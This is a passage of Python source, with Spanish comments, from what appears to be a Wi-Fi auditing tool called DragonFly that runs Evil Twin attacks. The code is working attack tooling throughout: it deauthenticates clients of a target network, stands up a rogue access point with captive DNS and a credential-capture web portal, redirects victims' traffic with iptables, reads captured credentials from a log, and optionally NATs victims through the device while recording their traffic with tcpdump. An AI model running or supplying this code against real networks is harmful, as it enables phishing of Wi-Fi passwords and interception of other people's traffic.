                if not current_ssid or current_ssid == expected_ssid:
                    return True, last_log
            elif get_interface_type(ap_iface) is None:
                # Sin iw no se puede verificar el tipo: dar un margen a hostapd.
                if "AP-ENABLED" in last_log:
                    return True, last_log
            time.sleep(0.5)
        return False, last_log

    def _start_dnsmasq(self, ap_iface: str, session_dir: str, log):
        """Arranca dnsmasq con configuración propia y verifica que siga vivo."""
        self.pm.terminate_proc("dnsmasq", timeout=2)
        # Limpieza dirigida de instancias huérfanas de ejecuciones anteriores.
        ProcessManager.pkill("dnsmasq_evil.conf", full=True)
        ProcessManager.pkill(r"dnsmasq .*Auditoria-[^ ]*/dnsmasq\.conf", full=True)

        conf_path = os.path.join(session_dir, "dnsmasq.conf")
        with open(conf_path, "w") as handle:
            handle.write(self.build_dnsmasq_config(ap_iface))

        log_path = os.path.join(session_dir, "dnsmasq.log")
        proc = self._start_logged("dnsmasq", ["sudo", "dnsmasq", "-C", conf_path, "-d"], log_path)
        time.sleep(1.2)
        if proc.poll() is not None:
            detail = self._read_log(log_path)
            hint = ""
            if "address already in use" in detail.lower():
                hint = (
                    f" Otro servicio está usando el puerto DNS {DNS_PORT} "
                    "o el puerto DHCP 67."
                )
            raise RuntimeError(f"dnsmasq terminó al iniciar.{hint}{self._last_line(detail)}")
        log("[+] dnsmasq activo (DHCP + DNS cautivo).")

    def _start_web(self, tmp_web: str, session_dir: str, log):
        """Arranca el servidor HTTP de captura y verifica que escuche."""
        capture_script = os.path.join(tmp_web, "capture.py")
        if not os.path.isfile(capture_script):
            raise RuntimeError("No se generó el servidor de captura.")

        log_path = os.path.join(session_dir, "web.log")
        python = sys.executable or "python3"
        proc = self._start_logged("web_server", ["sudo", python, capture_script], log_path)
        time.sleep(1.0)
        if proc.poll() is not None:
            detail = self._read_log(log_path)
            hint = ""
            if "address already in use" in detail.lower() or "errno 98" in detail.lower():
                hint = " Otro proceso está usando el puerto 80."
            raise RuntimeError(f"El servidor web cautivo terminó al iniciar.{hint}{self._last_line(detail)}")
        log("[+] Servidor web cautivo activo en el puerto 80.")

    # ------------------------------------------------------------------
    # Deauth
    # ------------------------------------------------------------------

    def _start_single_deauth(self, mon_deauth, ap_iface, red_target, deauth_mode, cliente_mac, log):
        if not mon_deauth:
            raise RuntimeError("No hay interfaz de monitor para el deauth.")
        if mon_deauth == ap_iface or share_phy(mon_deauth, ap_iface):
            raise RuntimeError(f"{mon_deauth} comparte radio con {ap_iface}.")
        if deauth_mode == "directed" and cliente_mac:
            log(f"[*] Deauth dirigido al cliente: {cliente_mac}")
        else:
            log("[*] Deauth en modo broadcast (todos los clientes).")
        self.wifi.start_deauth_attack(
            mon_iface=mon_deauth,
            target_red=red_target,
            cliente_mac=cliente_mac if deauth_mode == "directed" else None,
            count="0",
            on_output=log,
        )

    # ------------------------------------------------------------------
    # Iptables (cadenas propias, sin flush global)
    # ------------------------------------------------------------------

    @staticmethod
    def _iptables(*args, table=None, timeout=5):
        cmd = ["sudo", "iptables", "-w", "5"]
        if table:
            cmd.extend(["-t", table])
        cmd.extend(args)
        return safe_run(cmd, capture_output=True, text=True, timeout=timeout)

    def _chain_exists(self, table: str, chain: str) -> bool:
        result = self._iptables("-n", "-L", chain, table=table)
        return result.returncode == 0

    def _ensure_chain(self, table: str, chain: str):
        if not self._chain_exists(table, chain):
            result = self._iptables("-N", chain, table=table)
            if result.returncode != 0 and not self._chain_exists(table, chain):
                raise RuntimeError(f"No se pudo crear la cadena iptables {chain}: {(result.stderr or '').strip()}")

    def _insert_jump(self, table: str, parent: str, iface: str, chain: str):
        check = self._iptables("-C", parent, "-i", iface, "-j", chain, table=table)
        if check.returncode != 0:
            result = self._iptables("-I", parent, "1", "-i", iface, "-j", chain, table=table)
            if result.returncode != 0:
                raise RuntimeError(f"No se pudo enlazar {parent} -> {chain}: {(result.stderr or '').strip()}")

    def _insert_rule(self, table: str, parent: str, arguments, chain: str):
        """Inserta un salto con argumentos arbitrarios (``-s``, ``-o``...)."""
        args = tuple(arguments)
        check = self._iptables("-C", parent, *args, "-j", chain, table=table)
        if check.returncode == 0:
            return
        result = self._iptables(
            "-I", parent, "1", *args, "-j", chain, table=table
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"No se pudo enlazar {parent} -> {chain}: "
                f"{(result.stderr or '').strip()}"
            )

    def _install_iptables(self, ap_iface: str):
        """Redirige HTTP/DNS y permite DHCP en cadenas propias de DragonFly."""
        self._iptables_iface = ap_iface
        self._ensure_chain("nat", NAT_CHAIN)
        self._ensure_chain("filter", INPUT_CHAIN)
        self._iptables("-F", NAT_CHAIN, table="nat")
        self._iptables("-F", INPUT_CHAIN, table="filter")

        self._iptables(
            "-A", NAT_CHAIN, "-p", "tcp", "--dport", "80",
            "-j", "DNAT", "--to-destination", f"{GATEWAY}:80",
            table="nat",
        )
        for protocol in ("udp", "tcp"):
            self._iptables(
                "-A", NAT_CHAIN, "-p", protocol, "--dport", "53",
                "-j", "DNAT", "--to-destination", f"{GATEWAY}:{DNS_PORT}",
                table="nat",
            )
        self._iptables(
            "-A", INPUT_CHAIN, "-m", "conntrack", "--ctstate", "RELATED,ESTABLISHED",
            "-j", "ACCEPT", table="filter",
        )
        for protocol, port in (
            ("tcp", "80"),
            ("tcp", "53"),
            ("udp", "53"),
            ("tcp", str(DNS_PORT)),
            ("udp", str(DNS_PORT)),
            ("udp", "67"),
        ):
            self._iptables(
                "-A", INPUT_CHAIN, "-p", protocol, "--dport", port,
                "-j", "ACCEPT", table="filter",
            )

        self._insert_jump("nat", "PREROUTING", ap_iface, NAT_CHAIN)
        self._insert_jump("filter", "INPUT", ap_iface, INPUT_CHAIN)

    def _install_internet_iptables(self, ap_iface: str, upstream_iface: str,
                                   gateway: str, log):
        """
        Instala NAT IPv4, DNS local y forwarding AP <-> upstream.

        No se redirige HTTP al portal: el tráfico web debe salir a Internet.
        Las consultas DNS de los clientes sí se redirigen al dnsmasq local para
        que use los DNS reales del upstream.
        """
        self._iptables_iface = ap_iface
        self._upstream_iface = upstream_iface
        self._gateway = gateway
        try:
            self._ap_subnet = str(
                ipaddress.IPv4Interface(f"{gateway}/24").network
            )
        except ValueError as exc:
            raise RuntimeError(f"Gateway IPv4 inválido: {gateway}") from exc

        for table, chain in (
            ("nat", NAT_CHAIN),
            ("nat", POST_CHAIN),
            ("filter", INPUT_CHAIN),
            ("filter", FORWARD_CHAIN),
        ):
            self._ensure_chain(table, chain)
            self._iptables("-F", chain, table=table)

        for protocol in ("udp", "tcp"):
            self._iptables(
                "-A", NAT_CHAIN, "-p", protocol, "--dport", "53",
                "-j", "DNAT", "--to-destination", f"{gateway}:{DNS_PORT}",
                table="nat",
            )
        self._iptables(
            "-A", POST_CHAIN, "-s", self._ap_subnet, "-o", upstream_iface,
            "-j", "MASQUERADE", table="nat",
        )

        self._iptables(
            "-A", INPUT_CHAIN, "-m", "conntrack", "--ctstate",
            "RELATED,ESTABLISHED", "-j", "ACCEPT", table="filter",
        )
        for protocol, port in (
            ("tcp", "53"),
            ("udp", "53"),
            ("tcp", str(DNS_PORT)),
            ("udp", str(DNS_PORT)),
            ("udp", "67"),
        ):
            self._iptables(
                "-A", INPUT_CHAIN, "-p", protocol, "--dport", port,
                "-j", "ACCEPT", table="filter",
            )

        self._iptables(
            "-A", FORWARD_CHAIN, "-i", ap_iface, "-o", upstream_iface,
            "-j", "ACCEPT", table="filter",
        )
        self._iptables(
            "-A", FORWARD_CHAIN, "-i", upstream_iface, "-o", ap_iface,
            "-m", "conntrack", "--ctstate", "RELATED,ESTABLISHED",
            "-j", "ACCEPT", table="filter",
        )

        self._insert_jump("nat", "PREROUTING", ap_iface, NAT_CHAIN)
        self._insert_rule(
            "nat", "POSTROUTING", ("-s", self._ap_subnet), POST_CHAIN
        )
        self._insert_jump("filter", "INPUT", ap_iface, INPUT_CHAIN)
        self._insert_rule(
            "filter", "FORWARD",
            ("-i", ap_iface, "-o", upstream_iface), FORWARD_CHAIN,
        )
        self._insert_rule(
            "filter", "FORWARD",
            ("-i", upstream_iface, "-o", ap_iface), FORWARD_CHAIN,
        )
        log(f"[+] NAT activo: {self._ap_subnet} -> {upstream_iface} "
            f"(MASQUERADE) y DNS -> {gateway}:{DNS_PORT}.")

    def _delete_jumps(self, table: str, parent: str, chain: str):
        """Borra cualquier regla de ``parent`` que salte a nuestra cadena."""
        result = self._iptables("-S", parent, table=table)
        if result.returncode != 0:
            return
        for line in (result.stdout or "").splitlines():
            if f"-j {chain}" not in line:
                continue
            parts = line.split()
            if not parts or parts[0] != "-A":
                continue
            self._iptables("-D", *parts[1:], table=table)

    def _cleanup_iptables(self):
        """Elimina solo las cadenas y saltos creados por DragonFly."""
        for table, parent, chain in (
            ("nat", "PREROUTING", NAT_CHAIN),
            ("nat", "POSTROUTING", POST_CHAIN),
            ("filter", "INPUT", INPUT_CHAIN),
            ("filter", "FORWARD", FORWARD_CHAIN),
        ):
            self._delete_jumps(table, parent, chain)
            self._iptables("-F", chain, table=table)
            self._iptables("-X", chain, table=table)
        self._iptables_iface = None

    # ------------------------------------------------------------------
    # Sysctl, captura y bucle de Internet
    # ------------------------------------------------------------------

    @staticmethod
    def _sysctl_binary() -> str:
        return shutil.which("sysctl") or "/sbin/sysctl"

    @staticmethod
    def _read_sysctl(key: str):
        path = "/proc/sys/" + key.replace(".", "/")
        try:
            with open(path, "r", encoding="ascii") as handle:
                return handle.read().strip()
        except OSError:
            return None

    def _set_sysctl(self, key: str, value: str, log, required: bool = False):
        current = self._read_sysctl(key)
        if current is not None and key not in self._sysctl_state:
            self._sysctl_state[key] = current
        result = safe_run(
            ["sudo", self._sysctl_binary(), "-w", f"{key}={value}"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        if result.returncode != 0:
            message = (
                f"No se pudo ajustar {key}={value}: "
                f"{(result.stderr or '').strip()}"
            )
            if required:
                raise RuntimeError(message)
            log(f"[!] {message}")

    def _set_internet_sysctls(self, ap_iface: str, upstream_iface: str, log):
        """Activa forwarding y relaja rp_filter para el tráfico NAT."""
        self._set_sysctl("net.ipv4.ip_forward", "1", log, required=True)
        for iface in (ap_iface, upstream_iface):
            self._set_sysctl(
                f"net.ipv4.conf.{iface}.rp_filter", "2", log
            )
        self._set_sysctl("net.ipv4.conf.all.rp_filter", "2", log)
        # Evita que los clientes intenten salir por IPv6 sin pasar por el Pi.
        self._set_sysctl(
            f"net.ipv6.conf.{ap_iface}.disable_ipv6", "1", log
        )
        log("[+] IPv4 forwarding activo y rp_filter en modo loose.")

    def _restore_sysctls(self, log):
        """Devuelve los valores originales de los sysctl modificados."""
        if not self._sysctl_state:
            return
        for key, value in reversed(list(self._sysctl_state.items())):
            result = safe_run(
                ["sudo", self._sysctl_binary(), "-w", f"{key}={value}"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode != 0:
                log(f"[!] No se pudo restaurar {key}={value}.")
        self._sysctl_state = {}

    @staticmethod
    def _find_tcpdump() -> str | None:
        found = shutil.which("tcpdump")
        if found:
            return found
        for candidate in _TCPDUMP_CANDIDATES:
            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                return candidate
        return None

    def _start_capture(self, ap_iface: str, session_dir: str, log):
        """Captura el tráfico del AP en un pcap si tcpdump está instalado."""
        binary = self._find_tcpdump()
        if not binary:
            log("[!] tcpdump no está instalado; la captura pcap queda deshabilitada.")
            return
        pcap_path = os.path.join(session_dir, "traffic.pcap")
        log_path = os.path.join(session_dir, "capture.log")
        proc = self._start_logged(
            "capture",
            ["sudo", binary, "-i", ap_iface, "-n", "-s", "0", "-U",
             "-w", pcap_path],
            log_path,
        )
        time.sleep(0.8)
        if proc.poll() is not None:
            log(f"[!] tcpdump terminó al iniciar: {self._last_line(self._read_log(log_path))}")
            return
        self._capture_started = True
        log(f"[+] Captura de tráfico activa: {pcap_path}")

    def _internet_loop(self, session_dir: str, ap_iface: str,
                       upstream_iface: str, log, on_client=None):
        """Vigila procesos, upstream y leases DHCP de los clientes."""
        lease_file = os.path.join(session_dir, "dnsmasq.leases")
        seen_clients = set()
        warned = set()
        next_upstream_check = time.monotonic() + 10
        while not self._stop_event.is_set():
            time.sleep(2)
            if not self.pm.is_running("hostapd"):
                log("[!] hostapd se detuvo inesperadamente; cerrando Evil Twin.")
                break

            for name in ("dnsmasq", "capture"):
                if name == "capture" and not self._capture_started:
                    continue
                if name not in warned and not self.pm.is_running(name):
                    warned.add(name)
                    log(f"[!] {name} se detuvo; el modo con Internet puede estar incompleto.")

            if time.monotonic() >= next_upstream_check:
                next_upstream_check = time.monotonic() + 10
                route = find_upstream(ap_iface=ap_iface)
                if not route:
                    if "upstream" not in warned:
                        warned.add("upstream")
                        log("[!] No hay ruta por defecto; los clientes no tendrán Internet.")
                elif route.get("iface") != upstream_iface:
                    if "upstream_change" not in warned:
                        warned.add("upstream_change")
                        log(f"[!] El upstream cambió a {route.get('iface')}; "
                            f"el NAT sigue apuntando a {upstream_iface}.")

            if not os.path.exists(lease_file):
                continue
            try:
                with open(lease_file, "r", encoding="utf-8", errors="replace") as handle:
                    leases = handle.readlines()
            except OSError:
                continue
            for line in leases:
                parts = line.split()
                if len(parts) < 4:
                    continue
                mac, ip, hostname = parts[1], parts[2], parts[3]
                if ip in seen_clients:
                    continue
                seen_clients.add(ip)
                display = hostname if hostname and hostname != "*" else "sin hostname"
                log(f"[+] Cliente: {ip} ({display}, {mac})")
                if on_client:
                    try:
                        on_client(ip, mac, hostname)
                    except Exception:
                        pass
        log("[*] Bucle de Internet finalizado.")

    # ------------------------------------------------------------------
    # Bucle de credenciales y limpieza
    # ------------------------------------------------------------------

    def _credential_loop(self, cred_log: str, log, on_cred):
        last_lines = 0
        warned = set()
        while not self._stop_event.is_set():
            time.sleep(2)
            if not self.pm.is_running("hostapd"):
                log("[!] hostapd se detuvo inesperadamente; cerrando Evil Twin.")
                break
            for name in ("dnsmasq", "web_server"):
                if name not in warned and not self.pm.is_running(name):
                    warned.add(name)
                    log(f"[!] {name} se detuvo; el portal puede estar incompleto.")

            if not os.path.exists(cred_log):
                continue
            try:
                with open(cred_log, "r") as handle:
                    lines = handle.readlines()
            except OSError:
                continue
            if len(lines) > last_lines:
                for line in lines[last_lines:]:
                    cleaned = line.strip()
                    if not cleaned:
                        continue
                    log(f"[+] Credencial: {cleaned}")
                    if on_cred:
                        on_cred(cleaned)
                last_lines = len(lines)

    def _cleanup(self, session_dir, ap_iface: str, monitor_ifaces, log):
        """Detiene todo, restaura interfaces y elimina las reglas propias."""
        self._stop_event.set()

        try:
            self.wifi.stop_deauth_attack()
        except Exception:
            pass
        if self.multi_deauth:
            try:
                self.multi_deauth.stop()
            except Exception:
                pass
            self.multi_deauth = None

        for name in ("deauth", "capture", "web_server", "dnsmasq", "hostapd"):
            try:
                self.pm.terminate_proc(name, timeout=3)
            except Exception:
                pass
        self._capture_started = False

        self._cleanup_iptables()
        self._restore_sysctls(log)
        self._close_logs()

        for monitor in monitor_ifaces or []:
            if not monitor:
                continue
            try:
                self.wifi.disable_monitor_mode(monitor)
            except Exception as exc:
                log(f"[!] No se pudo restaurar {monitor}: {exc}")

        if self._ap_prepared:
            self._restore_ap_interface(ap_iface, log)
            self._ap_prepared = False

        if self._tmp_web:
            shutil.rmtree(self._tmp_web, ignore_errors=True)
            self._tmp_web = None

    def _restore_ap_interface(self, ap_iface: str, log):
        """Devuelve la interfaz AP a modo managed y a NetworkManager."""
        if not ap_iface:
            return
        safe_run(["sudo", "ip", "link", "set", ap_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "ip", "link", "set", ap_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        if restore_device(ap_iface):
            log(f"[+] {ap_iface} devuelta a NetworkManager.")
        else:
            log(f"[!] No se pudo devolver {ap_iface} a NetworkManager.")

    # ------------------------------------------------------------------
    # Utilidades de procesos y logs
    # ------------------------------------------------------------------

    def _start_logged(self, name: str, cmd, log_path: str):
        """Lanza un proceso redirigiendo stdout/stderr a un log de la sesión."""
        handle = open(log_path, "ab", buffering=0)
        try:
            proc = safe_popen(cmd, stdout=handle, stderr=subprocess.STDOUT)
        except Exception:
            handle.close()
            raise
        self._log_handles.append(handle)
        self.pm.register(name, proc)
        return proc

    def _close_logs(self):
        for handle in self._log_handles:
            try:
                handle.close()
            except Exception:
                pass
        self._log_handles.clear()

    @staticmethod
    def _read_log(path: str) -> str:
        try:
            with open(path, "r", errors="replace") as handle:
                return handle.read()
        except OSError:
            return ""

    @staticmethod
    def _last_line(text: str) -> str:
        for line in reversed((text or "").splitlines()):
            cleaned = line.strip()
            if cleaned:
                return f" Detalle: {cleaned}"
        return ""

    def _limpiar_procesos_previos(self):
        """Mata solo procesos huérfanos propios de ataques anteriores."""
        for name in ("deauth_active", "deauth", "web_server", "dnsmasq", "hostapd"):
            try:
                self.pm.terminate_proc(name, timeout=2)
            except Exception:
                pass

        # Patrones dirigidos: no se toca un hostapd/dnsmasq ajeno al ataque.
        ProcessManager.pkill("hostapd_evil.conf", full=True)
        ProcessManager.pkill(r"hostapd .*Auditoria-[^ ]*/hostapd\.conf", full=True)
        ProcessManager.pkill(r"hostapd .*EvilTwin-NAT-[^ ]*/hostapd\.conf", full=True)
        ProcessManager.pkill("dnsmasq_evil.conf", full=True)
        ProcessManager.pkill(r"dnsmasq .*Auditoria-[^ ]*/dnsmasq\.conf", full=True)
        ProcessManager.pkill(r"dnsmasq .*EvilTwin-NAT-[^ ]*/dnsmasq\.conf", full=True)
        ProcessManager.pkill("capture.py", full=True)
        ProcessManager.pkill(r"tcpdump .*EvilTwin-NAT-[^ ]*/traffic\.pcap", full=True)
        ProcessManager.pkill(r"aireplay-ng .*--deauth", full=True)
